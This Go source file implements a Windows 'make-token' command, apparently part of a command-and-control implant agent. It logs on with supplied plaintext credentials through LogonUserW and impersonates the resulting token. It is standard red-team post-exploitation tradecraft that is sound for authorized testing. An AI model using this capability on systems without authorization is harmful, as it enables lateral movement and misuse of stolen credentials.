//go:build windows
// +build windows

package commands

import (
	"encoding/json"
	"fmt"
	"syscall"
	"unsafe"

	"fawkes/pkg/structs"

	"golang.org/x/sys/windows"
)

// Global token handle - shared across token commands
// Based on xenon's gIdentityToken in Identity.c
var gIdentityToken windows.Token

// Windows API constants
const (
	LOGON32_LOGON_INTERACTIVE     = 2
	LOGON32_LOGON_NETWORK         = 3
	LOGON32_LOGON_BATCH           = 4
	LOGON32_LOGON_SERVICE         = 5
	LOGON32_LOGON_UNLOCK          = 7
	LOGON32_LOGON_NEW_CREDENTIALS = 9

	LOGON32_PROVIDER_DEFAULT = 0
	LOGON32_PROVIDER_WINNT50 = 3
)

var (
	advapi32 = windows.NewLazySystemDLL("advapi32.dll")
	procLogonUserW = advapi32.NewProc("LogonUserW")
	procImpersonateLoggedOnUser = advapi32.NewProc("ImpersonateLoggedOnUser")
	procRevertToSelf = advapi32.NewProc("RevertToSelf")
)

type MakeTokenCommand struct{}

func (c *MakeTokenCommand) Name() string {
	return "make-token"
}

func (c *MakeTokenCommand) Description() string {
	return "Create a token from plaintext credentials and impersonate it"
}

type MakeTokenParams struct {
	Domain   string `json:"domain"`
	Username string `json:"username"`
	Password string `json:"password"`
	LogonType int   `json:"logon_type"` // Optional: defaults to LOGON32_LOGON_NEW_CREDENTIALS (9)
}

// Execute implements xenon's TokenMake function from Token.c (lines 189-264)
func (c *MakeTokenCommand) Execute(task structs.Task) structs.CommandResult {
	// Parse arguments
	var params MakeTokenParams
	if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to parse parameters: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Validate required parameters
	if params.Username == "" {
		return structs.CommandResult{
			Output:    "Username is required",
			Status:    "error",
			Completed: true,
		}
	}

	if params.Password == "" {
		return structs.CommandResult{
			Output:    "Password is required",
			Status:    "error",
			Completed: true,
		}
	}

	// Default to "." for local machine if domain not specified
	if params.Domain == "" {
		params.Domain = "."
	}

	// Default to LOGON32_LOGON_NEW_CREDENTIALS if not specified (xenon default)
	if params.LogonType == 0 {
		params.LogonType = LOGON32_LOGON_NEW_CREDENTIALS
	}

	// IdentityAgentRevertToken() - Clean up any existing token (xenon Identity.c lines 35-52)
	if gIdentityToken != 0 {
		windows.CloseHandle(windows.Handle(gIdentityToken))
		gIdentityToken = 0
	}
	windows.RevertToSelf()

	// Convert strings to UTF-16 for Windows API
	usernamePtr, err := syscall.UTF16PtrFromString(params.Username)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to convert username: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	domainPtr, err := syscall.UTF16PtrFromString(params.Domain)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to convert domain: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	passwordPtr, err := syscall.UTF16PtrFromString(params.Password)
	if err != nil {
		return structs.CommandResult{
			Output:    fmt.Sprintf("Failed to convert password: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Determine provider based on logon type (xenon Token.c line 226)
	provider := LOGON32_PROVIDER_DEFAULT
	if params.LogonType == LOGON32_LOGON_NEW_CREDENTIALS {
		provider = LOGON32_PROVIDER_WINNT50
	}

	// Call LogonUserW to create token and store in gIdentityToken (xenon Token.c line 226)
	ret, _, err := procLogonUserW.Call(
		uintptr(unsafe.Pointer(usernamePtr)),
		uintptr(unsafe.Pointer(domainPtr)),
		uintptr(unsafe.Pointer(passwordPtr)),
		uintptr(params.LogonType),
		uintptr(provider),
		uintptr(unsafe.Pointer(&gIdentityToken)),
	)

	if ret == 0 {
		return structs.CommandResult{
			Output:    fmt.Sprintf("LogonUserW failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Check if token was created (xenon Token.c line 234)
	if gIdentityToken == 0 {
		return structs.CommandResult{
			Output:    "LogonUserW succeeded but returned null token",
			Status:    "error",
			Completed: true,
		}
	}

	// Impersonate the token (xenon Token.c line 236)
	ret, _, err = procImpersonateLoggedOnUser.Call(uintptr(gIdentityToken))
	if ret == 0 {
		windows.CloseHandle(windows.Handle(gIdentityToken))
		gIdentityToken = 0
		return structs.CommandResult{
			Output:    fmt.Sprintf("ImpersonateLoggedOnUser failed: %v", err),
			Status:    "error",
			Completed: true,
		}
	}

	// Get the new identity for confirmation (xenon Token.c lines 244-252)
	accountName, err := getTokenUserInfo(gIdentityToken)
	if err != nil {
		// Still succeeded, just couldn't get name
		accountName = "Successfully impersonated (unable to retrieve account name)"
	}

	return structs.CommandResult{
		Output:    accountName,
		Status:    "success",
		Completed: true,
	}
}

// getTokenUserInfo implements xenon's IdentityGetUserInfo (Identity.c lines 88-114)
func getTokenUserInfo(token windows.Token) (string, error) {
	tokenUser, err := token.GetTokenUser()
	if err != nil {
		return "", fmt.Errorf("GetTokenUser failed: %v", err)
	}

	account, domain, _, err := tokenUser.User.Sid.LookupAccount("")
	if err != nil {
		return "", fmt.Errorf("LookupAccount failed: %v", err)
	}

	return fmt.Sprintf("%s\\%s", domain, account), nil
}
